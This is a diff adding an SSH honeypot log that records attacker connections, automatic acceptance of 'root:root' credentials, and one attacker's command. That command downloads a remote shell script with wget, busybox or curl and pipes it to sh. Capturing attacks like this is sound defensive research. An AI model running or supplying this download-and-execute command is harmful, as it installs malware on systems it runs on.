@@ -1,0 +1,18 @@
+2025-11-23 00:35:22.340 - [Info] MITM Version: 1.4
+2025-11-23 00:35:22.342 - [Info] Auto Access Enabled: true
+2025-11-23 00:35:22.343 - [Debug] [Init] Auto Access Barrier: true
+2025-11-23 00:35:22.348 - [Info] SSH man-in-the-middle server for 172.20.0.5 listening on 0.0.0.0:10004
+2025-11-23 00:36:50.908 - [Debug] [Connection] Attacker connected: 45.78.229.147 | Client Identification: SSH-2.0-libssh_0.11.1
+2025-11-23 00:36:57.470 - [Debug] [Connection] Attacker closed the connection
+2025-11-23 00:37:55.613 - [Debug] [Connection] Attacker connected: 193.32.127.228 | Client Identification: SSH-2.0-paramiko_3.5.1
+2025-11-23 00:37:57.123 - [Debug] [Auth] Attacker 193.32.127.228 trying to authenticate with "password"
+2025-11-23 00:37:57.125 - [Debug] [Auto Access] Attacker: 193.32.127.228, Threshold: 1, Attempts: 1
+2025-11-23 00:37:57.125 - [Debug] [Auto Access] Compromising the honeypot
+2025-11-23 00:37:57.125 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2025-11-23 00:37:57.511 - [Debug] [Auth] Valid credentials - Password Authentication
+2025-11-23 00:37:57.511 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.5
+2025-11-23 00:37:57.562 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2025-11-23 00:37:58.546 - [Debug] [EXEC] Noninteractive mode attacker command: (wget -qO- http://74.194.191.52/rondo.yah.sh||busybox wget -qO- http://74.194.191.52/rondo.yah.sh||curl -s http://74.194.191.52/rondo.yah.sh||good -qO- http://74.194.191.52/rondo.yah.sh)|sh;echo infected;
+2025-11-23 00:38:00.065 - [Debug] [Connection] Attacker closed connection
+2025-11-23 00:38:00.067 - [Debug] [LXC] Container's OpenSSH server ended connection
+2025-11-23 00:38:00.067 - [Debug] [LXC] Container's OpenSSH server closed connection
